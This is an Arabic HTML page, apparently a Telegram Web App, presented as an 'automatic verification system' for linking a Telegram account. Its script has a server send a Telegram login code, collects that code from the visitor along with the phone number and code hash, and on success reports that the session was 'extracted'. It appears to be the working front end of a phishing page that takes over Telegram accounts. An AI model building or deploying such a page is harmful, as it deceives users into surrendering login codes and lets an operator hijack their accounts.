<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>نظام التحقق الآلي</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #18222d;
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: #242f3d;
      padding: 25px;
      border-radius: 12px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }
    input {
      width: 80%;
      padding: 12px;
      margin: 15px 0;
      border-radius: 8px;
      border: 1px solid #364353;
      background: #17212b;
      color: #fff;
      font-size: 18px;
      text-align: center;
    }
    button {
      background: #2ea6ff;
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      font-weight: bold;
      margin-top: 10px;
    }
    button:hover {
      background: #1a8ad6;
    }
    #codeSection {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card">
    <h2 id="title">ربط حساب تيليغرام</h2>
    <p id="statusDesc" style="color: #8fb1cc; font-size: 14px;">اضغط على الزر أدناه لإرسال كود التحقق إلى حسابك.</p>

    <button id="sendBtn" onclick="sendCode()">إرسال كود التحقق</button>

    <div id="codeSection">
      <input type="text" id="codeInputs" placeholder="أدخل رمز التحقق" maxlength="6">
      <button onclick="verifyCode()">تأكيد الرمز</button>
    </div>
  </div>

  <script>
    let globalPhoneHash = "";
    let globalPhone = "";

    async function sendCode() {
      document.getElementById('statusDesc').innerText = "جاري إرسال الكود...";
      try {
        const response = await fetch('/api/send-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        });
        const result = await response.json();

        if (result.success) {
          globalPhoneHash = result.phoneCodeHash;
          globalPhone = result.phone;
          document.getElementById('title').innerText = "أدخل الرمز";
          document.getElementById('statusDesc').innerText = "تم إرسال الرمز إلى تيليغرام، اكتبه هنا:";
          document.getElementById('sendBtn').style.display = 'none';
          document.getElementById('codeSection').style.display = 'block';
        } else {
          alert('خطأ: ' + result.error);
        }
      } catch (err) {
        alert('تعذر الاتصال بالسيرفر.');
      }
    }

    async function verifyCode() {
      const code = document.getElementById('codeInputs').value;
      if (!code) {
        alert('الرجاء إدخال الرمز');
        return;
      }

      try {
        const response = await fetch('/api/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phoneNumber: globalPhone,
            phoneCode: code,
            phoneCodeHash: globalPhoneHash
          })
        });

        const result = await response.json();
        if (result.success) {
          alert('تم تسجيل الدخول بنجاح واستخراج الجلسة!');
        } else {
          alert('خطأ: ' + result.error);
        }
      } catch (err) {
        alert('حدث خطأ أثناء التأكيد.');
      }
    }
  </script>
</body>
</html>
